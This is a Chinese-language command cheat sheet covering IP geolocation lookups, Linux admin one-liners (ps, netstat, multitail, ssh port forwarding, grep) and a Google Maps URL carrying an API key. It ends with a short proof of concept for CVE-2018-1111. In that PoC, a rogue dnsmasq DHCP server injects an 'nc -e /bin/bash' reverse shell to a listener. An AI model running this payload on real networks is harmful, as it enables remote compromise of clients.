## 开启wi-fi，查看自己当前ip、及经纬度
```
1、方法一
https://maps.googleapis.com/maps/api/browserlocation/json?browser=firefox&key=AIzaSyDBgL8fm9bD8RLShATOLI1xKmFcZ4ieMkM&sensor=true
https://github.com/lypiut/WhereAmI
$ git clone https://github.com/victor/whereami.git whereami
$ cd whereami
$ git checkout swift
$ git submodule update --init --recursive
$ xctool install
https://github.com/BenConstable/where-am-i
npm install -g --save where-am-i
var WhereAmI = require('where-am-i')
  , help = new WhereAmI()
help.findMe(
    function (place) {
        // Located successfully!
        console.log(place.lat)
        console.log(place.lng)
        console.log(place.country.name)
    }
  , function (err) {
        // Could not locate!
    }
)
2、方法二
curl http://ipinfo.io/
```

# 常用linux命令
##  实用的 xargs 命令

```
find / -name *.conf -type f -print | xargs file
find / -name *.conf -type f -print | xargs tar cjf test.tar.gz
```
## 命令或脚本后台运行

```
nohup mysqldump -uroot -pxxxxx —all-databases > ./alldatabases.sql &（xxxxx是密码）
nohup mysqldump -uroot -pxxxxx —all-databases > ./alldatabases.sql （后面不加&符号）
```

## 找出当前系统内存使用量较高的进程

```
ps -aux | sort -rnk 4 | head -20
```

## 找出当前系统CPU使用量较高的进程

```
ps -aux | sort -rnk 3 | head -20
```

## 同时查看多个日志或数据文件

```
wget ftp://ftp.is.co.za/mirror/ftp.rpmforge.net/redhat/el6/en/x86_64/dag/RPMS/multitail-5.2.9-1.el6.rf.x86_64.rpm
yum -y localinstall multitail-5.2.9-1.el6.rf.x86_64.rpm
multitail -e "Accepted" /var/log/secure -l "ping baidu.com"
```

## 持续ping并将结果记录到日志

```
ping api.jpush.cn | awk '{ print $0”    “ strftime(“%Y-%m-%d %H:%M:%S”,systime()) } ' >> /tmp/jiguang.log &
```

## 查看tcp连接状态

```
netstat -nat |awk '{print $6}'|sort|uniq -c|sort -rn
```

## 查找80端口请求数最高的前20个IP

```
netstat -anlp|grep 80|grep tcp|awk '{print $5}'|awk -F: '{print $1}'|sort|uniq -c|sort -nr|head -n20
```

## ssh实现端口转发
将发往本机（192.168.1.15）的9200端口访问转发到192.168.1.19的9200端口,命令执行完后，访问192.168.1.15:9200端口则真实是访问192.168.1.19:9200端口
```
ssh -p 22 -C -f -N -g -L 9200:192.168.1.19:9200 ihavecar@192.168.1.19
```

## 查找jsp中出现的关键字

```
grep -r -i --include \*.jsp --include \*.js 'JSESSIONID' .
grep: command
-r: recursively
-i: ignore-case
--include: all *.txt: text files (escape with \ just in case you have a directory with asterisks in the filenames)
'searchterm': What to search
./: Start at current directory.

find . -name '*.js' -o -name '*.jsp' -exec grep "JSESSIONID" {} \; -print
find . -name "*.js" | xargs grep -i "JSESSIONID"
```

# CVE-2018-1111 tweetable DHCP欺骗远程反弹shell PoC :) 

```
hacker server:
nc -l -p 1337 -v

in kali,start dhcp server:
killall dnsmasq
dnsmasq --interface=eth0 --bind-interfaces \
--except-interface=lo --dhcp-range=10.1.1.1,10.1.1.10,1h \
--conf-file=/dev/null --dhcp-option=6,10.1.1.1 \
--dhcp-option=3,10.1.1.1 \
--dhcp-option="252,x'&nc -e /bin/bash 10.1.1.1 1337 #"
```

